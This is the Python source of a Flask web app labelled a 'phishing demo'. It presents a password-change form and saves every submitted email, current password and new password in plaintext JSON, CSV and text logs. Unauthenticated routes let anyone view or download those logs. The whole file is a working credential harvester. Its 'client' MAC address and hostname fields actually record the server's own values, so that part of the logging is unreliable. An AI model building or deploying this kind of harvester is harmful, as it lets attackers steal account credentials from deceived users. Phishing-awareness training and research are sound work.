# app/app.py

import os
import json
import datetime
import socket
import uuid
import platform
import re
import csv
import sys

from flask import Flask, render_template, request, redirect, url_for, send_file, jsonify, Response

# then figure out paths
base_dir   = os.path.dirname(os.path.abspath(__file__))
assets_dir = os.path.join(base_dir, 'assets')

# then data directory (project-local ./data)
DATA_DIR      = os.environ.get('DATA_DIR', os.path.join(base_dir, 'data'))
LOG_FILE_JSON = os.path.join(DATA_DIR, 'submissions.json')
LOG_FILE_CSV  = os.path.join(DATA_DIR, 'submissions.csv')
LOG_FILE_TXT  = os.path.join(DATA_DIR, 'submissions.txt')

# then create Flask app
app = Flask(
    __name__,
    static_folder=assets_dir,
    static_url_path='/assets'
)
app.secret_key = 'gu_phishing_demo_secret_key'

# then helper: ensure logs folder + files exist
def initialize_log_files():
    os.makedirs(DATA_DIR, exist_ok=True)                        # then make folder
    if not os.path.exists(LOG_FILE_CSV):                        # then CSV
        with open(LOG_FILE_CSV, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow([
                'timestamp','email','current_password','new_password',
                'confirm_password','ip_address','mac_address',
                'hostname','user_agent'
            ])
    if not os.path.exists(LOG_FILE_JSON):                       # then JSON
        open(LOG_FILE_JSON, 'w').close()
    if not os.path.exists(LOG_FILE_TXT):                        # then TXT
        with open(LOG_FILE_TXT, 'w') as f:
            f.write("=== Phishing Demo Submissions ===\n\n" + "-"*80 + "\n\n")

# then call once on startup
initialize_log_files()

# then utility for console logs
def log_to_console(msg):
    print(msg, flush=True)

# then helpers to collect client info
def get_mac_address():
    try:
        mac = ':'.join(re.findall('..','%012x'%uuid.getnode()))
        return mac
    except:
        return "Unknown MAC"

def get_system_info():
    try:
        return {
            "platform": platform.platform(),
            "system": platform.system(),
            "release": platform.release(),
            "version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor()
        }
    except:
        return {"platform": "Unknown"}

def format_readable_log(data):
    info = "\n".join(f"  {k}: {v}" for k,v in data['system_info'].items())
    return f"""
=== Submission at {data['timestamp']} ===
Email: {data['email']}
Current: {data['current_password']}
New:     {data['new_password']}
Confirm: {data['confirm_password']}
IP:      {data['ip_address']}
MAC:     {data['mac_address']}
Host:    {data['hostname']}
Agent:   {data['user_agent']}

System Info:
{info}
"""

# then routes
@app.route('/')
def index():
    return Response(render_template('index.html'), mimetype='text/html')

@app.route('/submit', methods=['POST'])
def submit():
    # then get form data safely (avoid KeyError → 400)
    email            = request.form.get('email', '')
    current_password = request.form.get('currentPassword', '')
    new_password     = request.form.get('newPassword', '')
    confirm_password = request.form.get('confirmPassword', '')

    # then client info
    client_ip   = request.headers.get('X-Forwarded-For', request.remote_addr)
    mac_address = get_mac_address()
    hostname    = socket.gethostname()
    user_agent  = request.headers.get('User-Agent')
    system_info = get_system_info()
    timestamp   = datetime.datetime.utcnow().isoformat()

    # then assemble visitor info
    visitor_info = {
        "timestamp":        timestamp,
        "email":            email,
        "current_password": current_password,
        "new_password":     new_password,
        "confirm_password": confirm_password,
        "ip_address":       client_ip,
        "mac_address":      mac_address,
        "hostname":         hostname,
        "user_agent":       user_agent,
        "system_info":      system_info,
    }

    # then log submission to console
    log_to_console(f"PHISHING SUBMISSION:\n{json.dumps(visitor_info, indent=2)}")

    # then append to JSON
    with open(LOG_FILE_JSON, 'a') as f:
        f.write(json.dumps(visitor_info, default=str) + "\n")

    # then append to CSV
    with open(LOG_FILE_CSV, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            timestamp,
            email,
            current_password,
            new_password,
            confirm_password,
            client_ip,
            mac_address,
            hostname,
            user_agent,
        ])

    # then append to TXT
    with open(LOG_FILE_TXT, 'a') as f:
        f.write(format_readable_log(visitor_info) + "\n" + "-"*80 + "\n\n")

    # then always redirect to success
    return redirect('/success')

@app.route('/success')
def success():
    return Response(render_template('success.html'), mimetype='text/html')

@app.route('/view-logs')
def view_logs():
    with open(LOG_FILE_TXT) as f:
        content = f.read()
    count = content.count("=== Submission at")
    return Response(render_template('logs.html', logs=content, total=count), mimetype='text/html')

@app.route('/data/<kind>')
def download(kind):
    mapping = {
        'json': LOG_FILE_JSON,
        'csv':  LOG_FILE_CSV,
        'txt':  LOG_FILE_TXT
    }
    path = mapping.get(kind)
    if not path:
        return jsonify(error="Invalid file type, use json/csv/txt"), 400
    return send_file(path, as_attachment=True, download_name=f"submissions.{kind}")

if __name__ == '__main__':
    app.run(
        host=os.environ.get('HOST','0.0.0.0'),
        port=int(os.environ.get('PORT', 5000)),
        debug=os.environ.get('DEBUG','False').lower()=='true'
    )
